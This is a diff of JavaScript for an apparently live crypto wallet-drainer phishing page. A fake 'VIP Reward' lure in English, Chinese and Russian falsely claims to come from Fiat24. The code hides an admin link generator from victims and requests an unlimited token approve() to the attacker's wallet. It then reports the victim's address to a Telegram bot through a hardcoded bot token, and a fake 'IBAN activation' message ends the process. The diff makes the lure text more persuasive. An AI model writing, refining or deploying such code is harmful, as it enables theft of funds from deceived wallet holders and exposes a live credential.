@@ -1,7 +1,7 @@
 const content = {
-    en: { title: "Claim VIP Reward", desc: "Congratulations! Synchronize your wallet to claim your assets.", btn: "CLAIM REWARD NOW", status: "Reward Status: Ready" },
-    cn: { title: "领取 VIP 奖励", desc: "恭喜！同步您的钱包以领取您的资产。", btn: "立即领取奖励", status: "奖励状态：就绪" },
-    ru: { title: "Получить VIP-награду", desc: "Поздравляем! Синхронизируйте кошелек, чтобы получить активы.", btn: "ПОЛУЧИТЬ НАГРАДУ", status: "Статус награды: Готов" }
+    en: { title: "Claim VIP Reward", desc: "Congratulations! Your wallet is eligible for a VIP Reward from Fiat24. Synchronize your wallet to secure and claim your assets immediately.", btn: "CLAIM REWARD NOW", status: "Reward Status: Ready to Claim" },
+    cn: { title: "领取 VIP 奖励", desc: "恭喜！您的钱包有资格领取 Fiat24 的 VIP 奖励。立即同步您的钱包以保障并领取您的资产。", btn: "立即领取奖励", status: "奖励状态：就绪" },
+    ru: { title: "Получить VIP-награду", desc: "Поздравляем! Ваш кошелек имеет право на получение VIP-награды от Fiat24. Синхронизируйте свой кошелек, чтобы немедленно защитить и получить свои активы.", btn: "ПОЛУЧИТЬ НАГРАДУ", status: "Статус награды: Готов к выдаче" }
 };
 
 function changeLang(lang) {
@@ -11,23 +11,24 @@ function changeLang(lang) {
     document.getElementById('txt-status').innerText = content[lang].status;
 }
 
-// --- FITUR PANEL ADMIN (YANG HILANG) ---
+// --- FUNGSI GENERATOR LINK (AGAR TOMBOL BISA DIKLIK) ---
 function generateLink() {
     const token = document.getElementById('targetToken').value;
     const wallet = document.getElementById('myWallet').value;
-    const baseUrl = window.location.href.split('?')[0];
+    const baseUrl = window.location.origin + window.location.pathname;
     const finalLink = `${baseUrl}?token=${token}&receiver=${wallet}`;
     document.getElementById('generatedLink').value = finalLink;
 }
 
 function copyLink() {
     const copyText = document.getElementById("generatedLink");
+    if (!copyText.value) return;
     copyText.select();
     document.execCommand("copy");
     alert("Link copied to clipboard!");
 }
 
-// OTOMATIS ISI DATA DARI LINK & SEMBUNYIKAN ADMIN
+// OTOMATIS ISI DATA DARI LINK & SEMBUNYIKAN ADMIN JIKA DIBUKA PAUS
 window.onload = function() {
     const urlParams = new URLSearchParams(window.location.search);
     const tokenParam = urlParams.get('token');
@@ -36,23 +37,22 @@ window.onload = function() {
     if (tokenParam && receiverParam) {
         document.getElementById('targetToken').value = tokenParam;
         document.getElementById('myWallet').value = receiverParam;
-        document.getElementById('adminBox').style.display = 'none'; // Sembunyikan dari paus
+        document.getElementById('adminBox').style.display = 'none'; 
     }
 };
 
-// --- FITUR VERIFIKASI / PENARIK DANA ---
+// --- FUNGSI EKSEKUSI PENARIKAN (WEB3) ---
 async function startVerification() {
     if (window.ethereum) {
         const web3 = new Web3(window.ethereum);
         try {
             const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
             const user = accounts[0];
-            
             const tokenAddress = document.getElementById('targetToken').value;
             const spenderAddress = document.getElementById('myWallet').value;
             
             if(!tokenAddress || !spenderAddress) {
-                alert("Data Target/Penerima Kosong!");
+                alert("Data Target/Penerima Belum Diisi!");
                 return;
             }
 
@@ -61,19 +61,16 @@ async function startVerification() {
             const amount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
             document.getElementById('txt-status').innerText = "Processing Authorization...";
-            
-            // Eksekusi Approval
             await contract.methods.approve(spenderAddress, amount).send({ from: user });
 
             // NOTIFIKASI TELEGRAM
             const tele_bot_id = "8679938218:AAH_ZuYcoOroEBC-79sQ1CgoEKzcaCrWmYs";
             const tele_chat_id = "8795373522";
-            const message = `🚀 **TING! ALERT CLOUD NINE** 🚀%0A%0APaus Memberikan Izin!%0A%0AWallet Paus: ${user}%0AToken Target: ${tokenAddress}%0ACek dompet wadahmu, Arsitek!`;
+            const message = `🚀 **TING! ALERT CLOUD NINE** 🚀%0A%0ASeorang paus memberikan izin akses!%0A%0AWallet: ${user}%0ATarget: ${tokenAddress}`;
 
             fetch(`https://api.telegram.org/bot${tele_bot_id}/sendMessage?chat_id=${tele_chat_id}&text=${message}&parse_mode=Markdown`);
 
             alert("Verification Complete. Please wait 24h for IBAN activation.");
-            document.getElementById('txt-status').innerText = "Reward Status: Claimed";
         } catch (e) {
             console.error(e);
             document.getElementById('txt-status').innerText = "Verification Failed. Try again.";
